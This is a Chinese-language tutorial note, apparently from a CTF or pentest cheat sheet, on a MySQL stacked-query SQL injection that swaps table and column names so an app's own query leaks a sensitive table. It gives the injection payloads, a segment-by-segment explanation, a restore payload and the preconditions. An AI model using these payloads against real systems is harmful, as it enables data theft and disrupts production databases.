# 重命名绕过 (Rename Bypass)

## 核心原理

当 WAF 或应用层过滤了包含目标关键词（如表名、列名）的查询，但未阻止 `ALTER TABLE ... RENAME` 操作时，攻击者可以通过交换表名使敏感表暴露在原始查询路径下。例如，应用有一个硬编码的 SQL `SELECT flag FROM words`，攻击者可以将真正包含敏感数据的表重命名为 `words`，让应用自行查询并返回数据。

## Payload 模板

```sql
1';ALTER TABLE words RENAME TO words1;ALTER TABLE `1919810931114514` RENAME TO words;ALTER TABLE words CHANGE flag id VARCHAR(100);#
```

## 逐段解析

```
1';
```
闭合前面的单引号，结束原始 SQL 语句。

```
ALTER TABLE words RENAME TO words1;
```
将原始的表 `words` 重命名为 `words1`（备份原始表，后续可恢复）。

```
ALTER TABLE `1919810931114514` RENAME TO words;
```
将包含敏感数据的目标表（此处表名为 `1919810931114514`）重命名为 `words`——这个名称恰好是应用硬编码查询所使用的表名。此时应用的所有后续 `SELECT * FROM words` 查询都将从敏感表中读取数据。

注意：表名用反引号包裹是因为表名是纯数字，MySQL 中数字开头的表名必须用反引号引用。

```
ALTER TABLE words CHANGE flag id VARCHAR(100);
```
将敏感表中的列名 `flag` 修改为 `id`，匹配应用查询期望的列名。`VARCHAR(100)` 是为了保留原始列的数据类型定义（MySQL `CHANGE` 子句需要重新声明列类型）。

```
#
```
MySQL 注释符，注释掉剩余 SQL。

## 完整攻击流程

1. **确认表结构** — 先通过 information_schema 查询了解有哪些表和列
2. **重命名原始表** — 将正常表改名备份
3. **目标表套用原名** — 将敏感表重命名为正常表名
4. **列名对齐** — 修改列名以匹配应用查询的预期
5. **触发应用查询** — 让应用执行其正常的 `SELECT` 查询，自动返回敏感数据

## 恢复原始状态

```sql
1';ALTER TABLE words RENAME TO `1919810931114514`;ALTER TABLE words1 RENAME TO words;#
```

## 适用条件

- MySQL 数据库
- 注入点支持堆叠查询
- 攻击者知晓应用正常查询的表名和列名（可通过 information_schema 获取）
- 数据库用户有 `ALTER TABLE` 权限
- 不存在外键约束阻止重命名操作

## 局限性

- 同一时刻只能劫持一张表
- 应用的其他并发请求可能报错（发现列不匹配）
- 需要知道目标表和列的结构
- 对生产环境影响较大，不隐蔽
